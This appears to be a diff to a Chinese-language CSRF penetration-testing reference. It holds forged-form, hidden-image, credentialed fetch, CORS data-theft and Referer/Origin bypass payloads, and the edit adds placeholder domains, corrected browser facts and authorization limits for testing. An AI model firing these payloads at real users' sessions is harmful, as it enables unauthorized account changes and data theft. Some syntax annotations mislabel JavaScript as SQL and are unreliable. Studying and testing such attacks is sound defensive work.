@@ -15,7 +15,7 @@ _跨站请求伪造基础攻击技术_
 **1. 构造CSRF表单**
 > 构造自动提交的CSRF表单
 ```
-<form action="http://target.com/change-password" method="POST">
+<form action="https://target.example.invalid/change-password" method="POST">
   <input type="hidden" name="new_password" value="hacked123">
   <input type="hidden" name="confirm_password" value="hacked123">
   <input type="submit" value="Click me">
@@ -30,9 +30,9 @@ _跨站请求伪造基础攻击技术_
 **2. GET请求CSRF**
 > GET请求的CSRF攻击
 ```
-<img src="http://target.com/delete?id=123" style="display:none">
+<img src="https://target.example.invalid/delete?id=123" style="display:none">
 或直接诱导用户点击:
-http://target.com/delete?id=123
+https://target.example.invalid/delete?id=123
 ```
 **语法解析：**
 - `<img src>` — 图片标签自动请求 _tag_
@@ -41,11 +41,11 @@ http://target.com/delete?id=123
 > JSON格式的CSRF攻击
 ```
 <script>
-fetch("http://target.com/api/change-email", {
+fetch("https://target.example.invalid/api/change-email", {
   method: "POST",
   credentials: "include",
   headers: {"Content-Type": "text/plain"},
-  body: JSON.stringify({email: "attacker@evil.com"})
+  body: JSON.stringify({email: "attacker@collector.example.invalid"})
 });
 </script>
 ```
@@ -56,7 +56,7 @@ fetch("http://target.com/api/change-email", {
 **4. 链接诱导**
 > 诱导用户点击
 ```
-<a href="http://target.com/action?param=value">点击领取红包</a>
+<a href="https://target.example.invalid/action?param=value">点击领取红包</a>
 或短链接隐藏真实URL
 ```
 **语法解析：**
@@ -126,11 +126,11 @@ _针对JSON请求的CSRF攻击技术_
 > 使用text/plain绕过预检
 ```
 <script>
-fetch("http://target.com/api/update", {
+fetch("https://target.example.invalid/api/update", {
   method: "POST",
   credentials: "include",
   headers: {"Content-Type": "text/plain"},
-  body: JSON.stringify({email: "attacker@evil.com"})
+  body: JSON.stringify({email: "attacker@collector.example.invalid"})
 });
 </script>
 ```
@@ -153,7 +153,7 @@ fetch("http://target.com/api/update", {
 > 跨站脚本包含攻击
 ```
 # 利用JSONP回调
-<script src="http://target.com/api/data?callback=attacker"></script>
+<script src="https://target.example.invalid/api/data?callback=attacker"></script>
 function attacker(data) { console.log(data); }
 
 # 利用数组返回
@@ -193,7 +193,7 @@ application/x-www-form-urlencoded; charset=UTF-8` — 参数与载荷内容 _val
 > 使用FormData发送
 ```
 let formData = new FormData();
-formData.append("data", JSON.stringify({email: "attacker@evil.com"}));
+formData.append("data", JSON.stringify({email: "attacker@collector.example.invalid"}));
 fetch(url, {method: "POST", body: formData, credentials: "include"});
 ```
 **语法解析：**
@@ -253,7 +253,7 @@ _绕过CSRF防护的各种技术_
 ```
 # 正则匹配不严谨
 Referer: http://attacker.com/target.com/
-Referer: http://target.com.attacker.com/
+Referer: https://target.example.invalid.attacker.com/
 
 # 空Referer
 <meta name="referrer" content="no-referrer">
@@ -269,10 +269,10 @@ Referer: http://target.com.attacker.com/
 > 绕过Origin验证
 ```
 # Origin为null
-使用data URL或about:blank
+data URL或未带allow-same-origin的sandbox可能是opaque/null源；普通about:blank通常继承创建者源，不能据此假定null
 
 # 正则绕过
-Origin: http://target.com.attacker.com
+Origin: https://target.example.invalid.attacker.com
 Origin: http://attacktarget.com
 
 # IE11不发送Origin
@@ -283,14 +283,14 @@ IE11在某些情况下不发送Origin头
 > 绕过SameSite限制
 ```
 # SameSite=Lax
-GET请求会发送Cookie
+跨站顶层导航的安全方法GET可能携带Cookie；跨站img/iframe子资源GET不符合Lax例外
 构造GET形式的敏感操作
 
 # SameSite未设置
 默认行为可能允许跨站发送
 
 # 两分钟窗口
-SameSite=Lax有2分钟窗口期
+部分浏览器对“未显式设置SameSite、刚设置的Cookie”有约两分钟的默认Lax兼容例外；不适用于所有显式Lax Cookie
 ```
 **语法解析：**
 - `SameSite=Lax` — GET请求允许Cookie _value_
@@ -355,19 +355,20 @@ _绕过SameSite Cookie属性的CSRF攻击_
 ```
 # GET请求绕过
 构造GET形式的敏感操作
-<img src="http://target.com/delete?id=123">
+# 跨站图片不是Lax顶层导航，不能证明Lax绕过。
+<a href="https://target.example.invalid/test-action">受控合成测试导航</a>
 
 # 顶级导航
-<a href="http://target.com/action">点击</a>
-window.location = "http://target.com/action"
+<a href="https://target.example.invalid/action">点击</a>
+window.location = "https://target.example.invalid/action"
 
 # 两分钟窗口
-在用户交互后2分钟内发起请求
+某些浏览器仅在Cookie刚设置约两分钟内，且未显式设置SameSite时，兼容跨站顶层POST；不是用户交互后的通用窗口
 ```
 **语法解析：**
-- `GET请求` — Lax允许GET携带Cookie _value_
+- `GET请求` — Lax通常仅允许跨站顶层安全方法导航携带Cookie _value_
 - `顶级导航` — Lax允许顶级导航 _value_
-- `2分钟窗口` — 用户交互后的宽限期 _value_
+- `2分钟窗口` — 部分浏览器默认Lax对刚设置Cookie的兼容行为 _value_
 
 **2. SameSite=Strict绕过**
 > 绕过SameSite=Strict
@@ -389,7 +390,7 @@ Set-Cookie: session=attacker; Domain=.target.com
 ```
 # 旧浏览器默认行为
 Chrome < 80 默认None
-Safari 默认None
+其他浏览器及版本必须实测，不能假定统一默认None
 
 # 可直接发起CSRF攻击
 无需特殊绕过
@@ -411,31 +412,31 @@ Safari 默认None
 ```
 # HTTPS->HTTP降级
 从HTTPS站点发起HTTP请求
-某些情况下不发送SameSite
+Secure Cookie不会随HTTP发送，且混合内容/基于scheme的site规则可能阻止请求；降级不是通用SameSite绕过
 ```
 **语法解析：**
 - `#` — 命令/载荷起始 _command_
 - ` HTTPS->HTTP降级
 从HTTPS站点发起HTTP请求
-某些情况下不发送SameSite` — 参数与载荷内容 _value_
+Secure Cookie不会随HTTP发送，且混合内容/基于scheme的site规则可能阻止请求；降级不是通用SameSite绕过` — 参数与载荷内容 _value_
 
 **客户端重定向**
 > 客户端重定向
 ```
 # JavaScript重定向
-location.href = "http://target.com/action"
+location.href = "https://target.example.invalid/action"
 可能绕过某些SameSite检查
 ```
 **语法解析：**
 - `#` — 命令/载荷起始 _command_
 - ` JavaScript重定向
-location.href = "http://target.com/action"
+location.href = "https://target.example.invalid/action"
 可能绕过某些SameSite检查` — 参数与载荷内容 _value_
 
 
 **概述：** SameSite Cookie属性是浏览器层面的CSRF防御机制，但配置不当(如SameSite=None)或使用GET请求触发状态变更操作时仍可被绕过，需要结合其他防御措施。
 
-**漏洞原理：** SameSite绕过场景：1)SameSite=Lax下GET请求仍携带Cookie(针对GET方法的状态变更) 2)SameSite=None配置错误 3)子域名间Cookie共享 4)通过window.open/top-level导航绕过Lax限制 5)旧浏览器不支持SameSite属性。
+**漏洞原理：** SameSite绕过场景：1)SameSite=Lax下跨站顶层GET导航可能携带Cookie(不包括所有GET子资源) 2)SameSite=None配置错误 3)子域名间Cookie共享 4)通过window.open/top-level导航绕过Lax限制 5)旧浏览器不支持SameSite属性。
 
 **利用方法：** 完整利用流程：
 1. 确定SameSite配置
@@ -493,7 +494,7 @@ _绕过CSRF Token验证的技术_
 > 利用Token泄露
 ```
 # Token在URL中泄露
-http://target.com/page?token=xxx
+https://target.example.invalid/page?token=xxx
 
 # Token在Referer中泄露
 从包含Token的页面跳转
@@ -579,7 +580,7 @@ Content-Type: application/json
 **防御措施：** 防御措施：
 1. 使用强随机Token
 2. Token绑定会话
-3. Token一次性使用
+3. 根据风险选会话级或请求级Token；可重用本身不等于漏洞，关键是不可预测、绑定与正确验证
 4. 验证Token存在性
 
 ---
@@ -599,11 +600,11 @@ _绕过Referer验证的CSRF攻击_
 ```
 # 正则只检查包含
 Referer: http://attacker.com/target.com/
-Referer: http://target.com.attacker.com/
+Referer: https://target.example.invalid.attacker.com/
 Referer: http://attacktarget.com/
 
 # 正则只检查开头
-Referer: http://target.com.attacker.com/
+Referer: https://target.example.invalid.attacker.com/
 
 # 正则只检查结尾
 Referer: http://attacker.com/target.com
@@ -613,7 +614,7 @@ Referer: http://attacker.com/target.com
 - `开头匹配` — 只检查开头 _value_
 - `结尾匹配` — 只检查结尾 _value_
 
-**2. 空Referer绕过**
+**2. 空Referer处理测试**
 > 发送空Referer
 ```
 # 不发送Referer
@@ -622,8 +623,7 @@ Referer: http://attacker.com/target.com
 # data URL
 data:text/html,<script>CSRF</script>
 
-# about:blank
-about:blank
+# 普通about:blank通常继承创建者源，不是通用无Referer/null源办法
 
 # HTTPS->HTTP降级
 从HTTPS站点跳转到HTTP
@@ -650,7 +650,7 @@ Referer: http://sibling.target.com/
 ```
 # origin-only
 <meta name="referrer" content="origin">
-Referer: http://target.com
+Referer: https://target.example.invalid
 
 # origin-when-cross-origin
 <meta name="referrer" content="origin-when-cross-origin">
@@ -662,7 +662,7 @@ Referer: http://target.com
 > iframe绕过
 ```
 # 使用iframe嵌入目标
-<iframe src="http://target.com" referrerpolicy="no-referrer">
+<iframe src="https://target.example.invalid" referrerpolicy="no-referrer">
 
 # sandbox属性
 <iframe sandbox="allow-scripts" src="...">
@@ -670,7 +670,7 @@ Referer: http://target.com
 **语法解析：**
 - `#` — 命令/载荷起始 _command_
 - ` 使用iframe嵌入目标
-<iframe src="http://target.com" referrerpolicy="no-referrer">
+<iframe src="https://target.example.invalid" referrerpolicy="no-referrer">
 
 # sandbox属性
 <iframe sandbox="allow-scripts" src="...">` — 参数与载荷内容 _value_
@@ -689,7 +689,7 @@ Referer: http://target.com
 
 **概述：** Referer验证是CSRF防御的补充手段，但由于Referer头可被操纵或省略，基于Referer的防护通常不够可靠。多种技术可绕过不严格的Referer验证逻辑。
 
-**漏洞原理：** Referer绕过技术：1)使用Referrer-Policy: no-referrer不发送Referer头 2)HTTPS→HTTP降级不携带Referer 3)data: URI不发送Referer 4)正则匹配缺陷(如target.com.evil.com) 5)子域名绕过(sub.target.com)。
+**漏洞原理：** Referer绕过技术：1)使用Referrer-Policy: no-referrer不发送Referer头 2)HTTPS→HTTP降级不携带Referer 3)data: URI不发送Referer 4)正则匹配缺陷(如target.com.collector.example.invalid) 5)子域名绕过(sub.target.com)。
 
 **利用方法：** 完整利用流程：
 1. 分析Referer验证逻辑
@@ -719,7 +719,7 @@ _利用Flash进行CSRF攻击_
 > 检查跨域策略文件
 ```
 # 检查crossdomain.xml
-http://target.com/crossdomain.xml
+https://target.example.invalid/crossdomain.xml
 
 # 允许所有域
 <cross-domain-policy>
@@ -741,7 +741,7 @@ package {
   import flash.net.*;
   public class CSRF {
     public function CSRF() {
-      var req:URLRequest = new URLRequest("http://target.com/api/action");
+      var req:URLRequest = new URLRequest("https://target.example.invalid/api/action");
       req.method = URLRequestMethod.POST;
       req.data = "param=value";
       req.requestHeaders.push(new URLRequestHeader("Content-Type", "application/json"));
@@ -761,7 +761,7 @@ package {
 req.requestHeaders.push(
   new URLRequestHeader("Content-Type", "application/json")
 );
-req.data = JSON.stringify({email: "attacker@evil.com"});
+req.data = JSON.stringify({email: "attacker@collector.example.invalid"});
 ```
 **语法解析：**
 - `Content-Type` — 内容类型头 _header_
@@ -827,7 +827,7 @@ _利用CORS配置错误进行CSRF攻击_
 > 检测CORS配置
 ```
 # 发送测试请求
-curl -H "Origin: http://attacker.com" http://target.com/api
+curl -H "Origin: http://attacker.com" https://target.example.invalid/api
 
 # 检查响应头
 Access-Control-Allow-Origin: http://attacker.com
@@ -849,7 +849,7 @@ Access-Control-Allow-Origin: [请求的Origin]
 Access-Control-Allow-Credentials: true
 
 # 攻击代码
-fetch("http://target.com/api/sensitive", {
+fetch("https://target.example.invalid/api/sensitive", {
   credentials: "include"
 })
 .then(r => r.json())
@@ -867,7 +867,7 @@ Access-Control-Allow-Credentials: true
 
 # 使用data URL
 <iframe src="data:text/html,<script>
-fetch('http://target.com/api', {credentials: 'include'})
+fetch('https://target.example.invalid/api', {credentials: 'include'})
 .then(r => r.json()).then(sendToAttacker);
 </script>"></iframe>
 ```
@@ -883,7 +883,7 @@ fetch('http://target.com/api', {credentials: 'include'})
 target.com.attacker.com
 
 # 攻击代码
-fetch("http://target.com.api.attacker.com/api", {
+fetch("https://target.example.invalid.api.attacker.com/api", {
   credentials: "include"
 });
 ```
@@ -896,7 +896,7 @@ fetch("http://target.com.api.attacker.com/api", {
 > 窃取用户数据
 ```
 # 利用CORS窃取数据
-fetch("http://target.com/api/user", {
+fetch("https://target.example.invalid/api/user", {
   credentials: "include"
 })
 .then(r => r.json())
@@ -906,7 +906,7 @@ fetch("http://target.com/api/user", {
 ```
 **语法解析：**
 - `# 利用CORS窃取数据
-fetch("http://target.com/api/user", {
+fetch("https://target.example.invalid/api/user", {
   credentials: "include"
 }` — 攻击载荷 _value_
 
@@ -914,7 +914,7 @@ fetch("http://target.com/api/user", {
 > 执行敏感操作
 ```
 # 利用CORS执行操作
-fetch("http://target.com/api/delete", {
+fetch("https://target.example.invalid/api/delete", {
   method: "POST",
   credentials: "include",
   headers: {"Content-Type": "application/json"},
@@ -923,7 +923,7 @@ fetch("http://target.com/api/delete", {
 ```
 **语法解析：**
 - `# 利用CORS执行操作
-fetch("http://target.com/api/` — SQL表达式 _value_
+fetch("https://target.example.invalid/api/` — SQL表达式 _value_
 - `delete` — SQL关键字 _keyword_
 - `", {
   method: "POST",
@@ -933,7 +933,7 @@ fetch("http://target.com/api/` — SQL表达式 _value_
 });` — SQL表达式 _value_
 
 
-**概述：** CORS(Cross-Origin Resource Sharing)配置错误可被利用来绕过同源策略的CSRF防护，特别是当Access-Control-Allow-Origin反射请求的Origin头或配置为通配符时。
+**概述：** CORS配置错误可能允许脚本读取跨源响应，但CORS不是CSRF防护本身。ACAO:*与带凭证读取不兼容；反射任意精确Origin并允许凭证才可能造成相应读取风险。简单请求即使响应不可读也可能已产生状态变更。
 
 **漏洞原理：** CORS相关CSRF风险：1)Access-Control-Allow-Origin反射任意Origin 2)配合Access-Control-Allow-Credentials: true泄露认证数据 3)内网域名在白名单中可从内网发起攻击 4)null Origin在白名单中(iframe sandbox可伪造)。
 
@@ -950,3 +950,13 @@ fetch("http://target.com/api/` — SQL表达式 _value_
 4. 使用SameSite Cookie
 
 ---
+
+## 浏览器验证与限制
+
+只在顶层 SKILL.md 逐命令授权范围内，用受控浏览器、两个合成站点和可恢复的测试账户/操作验证；不要向真实用户投递自动提交页或执行真实转账/删号。将实际Cookie是否随请求发送、是否到达服务端、状态是否变更、响应是否可读分别记录。credentials:include不覆盖SameSite、Secure或第三方Cookie策略。
+
+text/plain JSON例子只有在后端接受该媒体类型并按JSON解析时才成立；严格application/json通常触发预检。ACAO通配符不允许带凭证读取，不应把它和反射Origin当作同一漏洞。SameSite的site不等于origin，受控兄弟子域可同站但跨源；None可能是业务所需，并非自动存在漏洞。Token重复使用不自动构成重放缺陷；需证明缺少绑定/验证导致未授权操作。
+
+Flash/SWF段落是已停用客户端的历史材料，不能用于现代浏览器复现或建议重新启用插件。现代Referrer-Policy常在跨源时只发送origin，不能凭URL中有Token就断言第三方收到完整查询；核验实际请求，避免收集真实令牌。来源验证应精确比较scheme/host/port，并为缺失/null Origin定义拒绝或强Token回退策略，不能只做域名子串匹配。
+
+参考：[MDN Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie)、[MDN CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)。未启动浏览器或投递页面。
